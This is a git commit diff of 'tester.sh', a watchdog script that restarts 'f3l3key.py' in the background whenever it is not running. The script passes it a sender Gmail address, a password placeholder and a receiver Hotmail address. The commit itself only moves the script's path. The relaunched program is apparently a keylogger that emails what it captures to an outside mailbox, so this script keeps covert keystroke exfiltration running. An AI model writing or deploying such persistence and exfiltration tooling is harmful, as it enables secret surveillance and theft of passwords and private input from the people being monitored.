bb220e0116b10f7cd19103a23ccc75a953b46128
f3l3p1n0 <marc.39111@hotmail.com>
2023-05-17 14:11:14 +0200

    Update tester.sh

--- tester.sh
+++ tester.sh
@@ -3,6 +3,6 @@
 if pgrep -f f3l3key.py > /dev/null; then
     :
 else
-    python3 /home/user/Descargas/f3l3key.py emisor@gmail.com pega_la_clave_aqui receptor@hotmail.com &
+    python3 /home/user/Descargas/f3l3key/f3l3key.py emisor@gmail.com pega_la_clave_aqui receptor@hotmail.com &
 fi
 
